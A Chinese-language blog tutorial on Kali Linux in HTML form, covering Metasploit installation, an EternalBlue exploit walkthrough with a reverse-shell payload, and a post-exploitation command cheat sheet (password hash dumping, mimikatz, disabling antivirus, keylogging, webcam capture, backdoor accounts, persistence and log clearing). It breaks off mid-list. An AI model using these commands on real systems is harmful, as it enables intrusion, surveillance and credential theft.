@@ -1,0 +1,646 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha256-yIDrPSXHZdOZhAqiBP7CKzIwMQmRCJ8UeB8Jo17YC4o=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="对kali的工具介绍和使用。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="kali">
+<meta property="og:url" content="http://example.com/2023/12/29/Kali/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="对kali的工具介绍和使用。">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-12-29T11:23:25.000Z">
+<meta property="article:modified_time" content="2024-01-07T12:40:14.421Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="kali">
+<meta property="article:tag" content="msf">
+<meta property="article:tag" content="dirsearch">
+<meta property="article:tag" content="nmap">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://example.com/2023/12/29/Kali/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2023/12/29/Kali/","path":"2023/12/29/Kali/","title":"kali"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>kali | Hexo</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Hexo</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#kali%E9%95%9C%E5%83%8F%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85"><span class="nav-number">1.</span> <span class="nav-text">kali镜像下载安装</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#msf"><span class="nav-number">2.</span> <span class="nav-text">msf</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#MSF%E7%9A%84%E6%9B%B4%E6%96%B0"><span class="nav-number">2.1.</span> <span class="nav-text">MSF的更新</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Metasploit%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E5%8D%87%E7%BA%A7"><span class="nav-number">2.2.</span> <span class="nav-text">Metasploit的安装和升级</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%EF%BC%9A"><span class="nav-number">2.3.</span> <span class="nav-text">使用方法：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F%E9%98%B6%E6%AE%B5"><span class="nav-number">2.4.</span> <span class="nav-text">后渗透阶段</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Post-%E5%90%8E%E6%B8%97%E9%80%8F%E6%A8%A1%E5%9D%97"><span class="nav-number">2.4.1.</span> <span class="nav-text">Post 后渗透模块</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E4%B8%BB%E6%9C%BA%E6%98%AF%E5%90%A6%E8%BF%90%E8%A1%8C%E5%9C%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8A"><span class="nav-number">2.4.2.</span> <span class="nav-text">查看主机是否运行在虚拟机上</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B3%E9%97%AD%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6"><span class="nav-number">2.4.3.</span> <span class="nav-text">关闭杀毒软件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E7%9A%84%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF"><span class="nav-number">2.4.4.</span> <span class="nav-text">获取目标主机的详细信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AE%BF%E9%97%AE%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F"><span class="nav-number">2.4.5.</span> <span class="nav-text">访问文件系统</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8A%E4%BC%A0-%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6"><span class="nav-number">2.4.6.</span> <span class="nav-text">上传&#x2F;下载文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">2.4.7.</span> <span class="nav-text">权限提升</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81"><span class="nav-number">2.4.8.</span> <span class="nav-text">获取用户密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%90%E8%A1%8C%E7%A8%8B%E5%BA%8F"><span class="nav-number">2.4.9.</span> <span class="nav-text">运行程序</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE"><span class="nav-number">2.4.10.</span> <span class="nav-text">屏幕截图</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%96%B0%E8%B4%A6%E5%8F%B7"><span class="nav-number">2.4.11.</span> <span class="nav-text">创建一个新账号</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%90%AF%E7%94%A8%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2"><span class="nav-number">2.4.12.</span> <span class="nav-text">启用远程桌面</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95"><span class="nav-number">2.4.13.</span> <span class="nav-text">键盘记录</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E3%80%82%E3%80%82%E3%80%82"><span class="nav-number">2.4.14.</span> <span class="nav-text">。。。</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-exploit"><span class="nav-number">2.5.</span> <span class="nav-text">漏洞利用(exploit)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7-payload"><span class="nav-number">2.6.</span> <span class="nav-text">攻击载荷(payload)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Meterpreter"><span class="nav-number">2.7.</span> <span class="nav-text">Meterpreter</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dirsearch"><span class="nav-number">3.</span> <span class="nav-text">dirsearch</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%BA%E5%88%B6%EF%BC%88Mandatory%EF%BC%89%EF%BC%9A"><span class="nav-number">3.1.</span> <span class="nav-text">强制（Mandatory）：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%97%E5%85%B8%E8%AE%BE%E7%BD%AE%EF%BC%88Dictionary-Settings%EF%BC%89%EF%BC%9A"><span class="nav-number">3.2.</span> <span class="nav-text">字典设置（Dictionary Settings）：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%84%E8%AE%BE%E7%BD%AE%EF%BC%88General-Settings%EF%BC%89%EF%BC%9A"><span class="nav-number">3.3.</span> <span class="nav-text">常规设置（General Settings）：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%B7%E6%B1%82%E8%AE%BE%E7%BD%AE%EF%BC%88Request-Settings%EF%BC%89%EF%BC%9A"><span class="nav-number">3.4.</span> <span class="nav-text">请求设置（Request Settings）：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9E%E6%8E%A5%E8%AE%BE%E7%BD%AE%EF%BC%88Connection-Settings%EF%BC%89%EF%BC%9A"><span class="nav-number">3.5.</span> <span class="nav-text">连接设置（Connection Settings）：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E5%A6%82%EF%BC%9A"><span class="nav-number">3.6.</span> <span class="nav-text">例如：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#nmap"><span class="nav-number">4.</span> <span class="nav-text">nmap</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E6%A0%87%E8%A7%84%E6%A0%BC%EF%BC%88TARGET-SPECIFICATION%EF%BC%89%EF%BC%9A"><span class="nav-number">4.1.</span> <span class="nav-text">目标规格（TARGET SPECIFICATION）：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%EF%BC%9A"><span class="nav-number">4.2.</span> <span class="nav-text">主机发现：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%AB%E6%8F%8F%E6%8A%80%E6%9C%AF%EF%BC%9A"><span class="nav-number">4.3.</span> <span class="nav-text">扫描技术：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E8%A7%84%E6%A0%BC%E5%92%8C%E6%89%AB%E6%8F%8F%E9%A1%BA%E5%BA%8F%EF%BC%9A"><span class="nav-number">4.4.</span> <span class="nav-text">端口规格和扫描顺序：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1-%E7%89%88%E6%9C%AC%E6%A3%80%E6%B5%8B%EF%BC%9A"><span class="nav-number">4.5.</span> <span class="nav-text">服务&#x2F;版本检测：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC%E6%89%AB%E6%8F%8F%EF%BC%88SCRIPT-SCAN%EF%BC%89%EF%BC%9A"><span class="nav-number">4.6.</span> <span class="nav-text">脚本扫描（SCRIPT SCAN）：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A3%80%E6%B5%8B%EF%BC%88OS-DETECTION%EF%BC%89%EF%BC%9A"><span class="nav-number">4.7.</span> <span class="nav-text">操作系统检测（OS DETECTION）：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E5%92%8C%E6%80%A7%E8%83%BD%EF%BC%88TIMING-AND-PERFORMANCE%EF%BC%89%EF%BC%9A"><span class="nav-number">4.8.</span> <span class="nav-text">时间和性能（TIMING AND PERFORMANCE）：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B2%E7%81%AB%E5%A2%99-IDS-%E8%A7%84%E9%81%BF%E5%92%8C%E6%AC%BA%E9%AA%97%EF%BC%88FIREWALL-IDS-EVASION-AND-SPOOFING%EF%BC%89%EF%BC%9A"><span class="nav-number">4.9.</span> <span class="nav-text">防火墙&#x2F;IDS 规避和欺骗（FIREWALL&#x2F;IDS EVASION AND SPOOFING）：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BE%93%E5%87%BA%EF%BC%9A"><span class="nav-number">4.10.</span> <span class="nav-text">输出：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9D%82%E9%A1%B9"><span class="nav-number">4.11.</span> <span class="nav-text">杂项</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B6%E5%AE%83"><span class="nav-number">5.</span> <span class="nav-text">其它</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">23</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">45</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/12/29/Kali/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="kali | Hexo">
+      <meta itemprop="description" content="对kali的工具介绍和使用。">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          kali
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2023-12-29 19:23:25" itemprop="dateCreated datePublished" datetime="2023-12-29T19:23:25+08:00">2023-12-29</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2024-01-07 20:40:14" itemprop="dateModified" datetime="2024-01-07T20:40:14+08:00">2024-01-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Linux/" itemprop="url" rel="index"><span itemprop="name">Linux</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">对kali的工具介绍和使用。</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><blockquote>
+<p>参考：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/575154685">kali命令大全</a></p>
+</blockquote>
+<h2 id="kali镜像下载安装"><a href="#kali镜像下载安装" class="headerlink" title="kali镜像下载安装"></a>kali镜像下载安装</h2><p>KaliLinux是一种基于Debian的Linux发行版，专门用于网络安全和渗透测试。</p>
+<p>KaliLinux官方镜像下载站点：<a target="_blank" rel="noopener" href="https://cdimage.kali.org/">这里</a>。也可以去官网下载：<a target="_blank" rel="noopener" href="https://www.kali.org/">kali</a></p>
+<p>在这个网站上，你可以找到各种版本的KaliLinux镜像文件，包括64位和32位的版本，以及适用于不同硬件平台的版本，如x86、ARM和VMware等。你可以通过点击相应的链接来下载你所需要的镜像文件来安装KaliLinux或创建可启动的LiveUSB。此外，网站还提供了SHA-1校验和文件，以确保你下载的镜像文件没有被篡改。</p>
+<p>例示：<a target="_blank" rel="noopener" href="https://cdimage.kali.org/kali-2023.3/kali-linux-2023.3-installer-amd64.iso">kali-linux-2023.3-installer-arm64.iso</a></p>
+<h2 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h2><blockquote>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/235631">MSF使用详解</a> 、 <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/604440914?utm_id=0">kali msfconsole命令详解以及靶机攻破实战,让目标服务器任你摆步</a></p>
+</blockquote>
+<p>Metasploit Framework(MSF)是一款开源安全漏洞检测工具，附带数千个已知的软件漏洞，并保持持续更新。Metasploit可以用来信息收集、漏洞探测、漏洞利用等渗透测试的全流程，被安全社区冠以“可以黑掉整个宇宙”之名。刚开始的Metasploit是采用Perl语言编写的，但是再后来的新版中，改成了用Ruby语言编写的了。在kali中，自带了Metasploit工具。</p>
+<h3 id="MSF的更新"><a href="#MSF的更新" class="headerlink" title="MSF的更新"></a>MSF的更新</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfupdate</span><br></pre></td></tr></table></figure>
+
+<h3 id="Metasploit的安装和升级"><a href="#Metasploit的安装和升级" class="headerlink" title="Metasploit的安装和升级"></a>Metasploit的安装和升级</h3><p>在一般的linux中，默认是不安装MSF的。以下是在非kali的Linux下安装MSF框架。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall   </span><br><span class="line">adduser msf           #添加msf用户</span><br><span class="line">su msf                #切换到msf用户</span><br><span class="line">cd /opt/metasploit-framework/bin    #切换到msf所在的目录 </span><br><span class="line">./msfconsole          #以后启动msfconsole，都切换到msf用户下启动，这样会同步数据库。如果使用root用户启动的话，不会同步数据库  </span><br><span class="line"></span><br><span class="line">也可以将msfconsole加入到执行目录下，这样在任何目录直接msfconsole就可以了</span><br><span class="line">ln -s /opt/metasploit-framework/bin/msfconsole /usr/bin/msfconsole</span><br><span class="line"></span><br><span class="line">#备注：</span><br><span class="line">#初次运行msf会创建数据库，但是msf默认使用的PostgreSQL数据库不能与root用户关联，这也这也就是需要新建用户msf来运行metasploit的原因所在。如果你一不小心手一抖，初次运行是在root用户下，请使用 msfdb reinit 命令，然后使用非root用户初始化数据库。        </span><br><span class="line"></span><br><span class="line">MSF后期的升级：msfupdate</span><br></pre></td></tr></table></figure>
+
+<h3 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">msfconsole     # 进入框架</span><br><span class="line"></span><br><span class="line">search xxx     # 使用search命令查找相关漏洞，例如:search ms17-010,</span><br><span class="line">               # 查mysql:        search name:mysql;</span><br><span class="line">               # 查joomla:       search joomla;</span><br><span class="line">               # 查ubutu漏洞:     searchsploit ubuntu 16.04；</span><br><span class="line">               # 查ms08-067漏洞:  search ms08-067 </span><br><span class="line"></span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue    # 使用use进入模块，也可以用编号代替，例如:use 2</span><br><span class="line"></span><br><span class="line">show options                 # 查看模块需要配置的参数，含有yes的是必须设置的参数</span><br><span class="line"></span><br><span class="line">set RHOST 192.168.125.138    # 设置参数。RHOSTS 参数是要探测主机的ip或ip范围，我们探测一个ip范围内的主机是否存在漏洞，例如:set RHOSTS 192.168.125.125-129.168.125.140</span><br><span class="line"></span><br><span class="line">exploit / run                # 攻击，执行其中一个就行。这里有+号的就是可能存在漏洞的主机</span><br><span class="line"></span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue    # 选择漏洞攻击模块</span><br><span class="line"></span><br><span class="line">info             # 使用info查看模块/漏洞信息</span><br><span class="line"></span><br><span class="line">show targets     # 查看可攻击的系统平台，这个命令显示该攻击模块针对哪些特定操作系统版本、语言版本的系统</span><br><span class="line"></span><br><span class="line">show payloads    # 查看攻击载荷，该命令可以查看当前漏洞利用模块下可用的所有Payload</span><br><span class="line"></span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp    # 设置攻击载荷，好像也可以不用做</span><br><span class="line"></span><br><span class="line">show options     # 查看模块需要配置的参数</span><br><span class="line"></span><br><span class="line">set RHOST 192.168.125.138    # 设置RHOST，也就是要攻击主机的ip</span><br><span class="line"></span><br><span class="line">set LHOST 192.168.125.129    # 设置LHOST，也就是我们主机的ip，用于接收从目标机弹回来的shell</span><br><span class="line"></span><br><span class="line"># 如果我们这里不设置lport的话，默认是4444端口监听</span><br><span class="line"></span><br><span class="line">exploit    # 攻击</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>我们也可以将攻击代码写入 configure.rc（只要是以 .rc 结尾的文件）配置文件中，然后使用命令 <code>msfconsole -r configure.rc</code> 进行自动攻击！</p>
+</blockquote>
+<p>Auxiliary辅助探测模块：该模块不会直接在攻击机和靶机之间建立访问，它们只负责执行扫描，嗅探，指纹识别等相关功能以辅助渗透测试。</p>
+<p>Exploit漏洞利用模块：可以去利用漏洞攻击。</p>
+<p>Payload攻击载荷模块：攻击载荷是我们期望在目标系统在被渗透攻击之后完成的实际攻击功能的代码，成功渗透目标后，用于在目标系统上运行任意命令。</p>
+<h3 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h3><p>运行了exploit命令之后，我们开启了一个reverse TCP监听器来监听本地的 4444 端口，即我（攻击者）的本地主机地址（LHOST）和端口号（LPORT）。</p>
+<p>运行成功之后，我们将会看到命令提示符 <code>meterpreter &gt;</code> 出现，我们输入：<code> shell</code> 即可切换到目标主机的windows shell，要想从目标主机shell退出到 meterpreter ，我们只需输入：<code>exit</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">background       # 想从 meterpreter 退出到MSF框架</span><br><span class="line"></span><br><span class="line">sessions -l      # 查看我们获得的shell，前面有id</span><br><span class="line"></span><br><span class="line">sessions -i 1    # 可切换到id为1的shell</span><br><span class="line"></span><br><span class="line">shell            # 可进入 cmd 类型的控制</span><br><span class="line"></span><br><span class="line">powershell       # 可进入 powershell 类型的控制台</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">sysinfo             #查看目标主机系统信息</span><br><span class="line">run scraper         #查看目标主机详细信息</span><br><span class="line">run hashdump        #导出密码的哈希</span><br><span class="line">load kiwi           #加载mimikatz</span><br><span class="line">ps                  #查看目标主机进程信息</span><br><span class="line">pwd                 #查看目标当前目录(windows)</span><br><span class="line">getlwd              #查看目标当前目录(Linux)</span><br><span class="line">search -f *.jsp -d e:\                #搜索E盘中所有以.jsp为后缀的文件</span><br><span class="line">download  e:\test.txt  /root          #将目标机的e:\test.txt文件下载到/root目录下</span><br><span class="line">upload    /root/test.txt d:\test      #将/root/test.txt上传到目标机的 d:\test\ 目录下</span><br><span class="line">getpid              #查看当前Meterpreter Shell的进程PID</span><br><span class="line">migrate 1384        #将当前Meterpreter Shell的进程迁移到PID为1384的进程上</span><br><span class="line">idletime            #查看主机运行时间</span><br><span class="line">getuid              #查看获取的当前权限</span><br><span class="line">getsystem           #提权,获得的当前用户是administrator才能成功</span><br><span class="line">run  killav         #关闭杀毒软件</span><br><span class="line">screenshot          #截图</span><br><span class="line">webcam_list         #查看目标主机的摄像头</span><br><span class="line">webcam_snap         #拍照</span><br><span class="line">webcam_stream       #开视频</span><br><span class="line">execute  参数  -f 可执行文件   #执行可执行程序</span><br><span class="line">run getgui -u hack -p 123    #创建hack用户，密码为123</span><br><span class="line">run getgui -e                #开启远程桌面</span><br><span class="line">keyscan_start                #开启键盘记录功能</span><br><span class="line">keyscan_dump                 #显示捕捉到的键盘记录信息</span><br><span class="line">keyscan_stop                 #停止键盘记录功能</span><br><span class="line">uictl  disable  keyboard     #禁止目标使用键盘</span><br><span class="line">uictl  enable   keyboard     #允许目标使用键盘</span><br><span class="line">uictl  disable  mouse        #禁止目标使用鼠标</span><br><span class="line">uictl  enable   mouse        #允许目标使用鼠标</span><br><span class="line">load                         #使用扩展库</span><br><span class="line">run                          #使用扩展库</span><br><span class="line"></span><br><span class="line">run persistence -X -i 5 -p 8888 -r 192.168.10.27        #反弹时间间隔是5s 会自动连接192.168.27的4444端口，缺点是容易被杀毒软件查杀</span><br><span class="line">portfwd add -l 3389 -r 192.168.11.13 -p 3389     #将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址</span><br><span class="line">clearev                       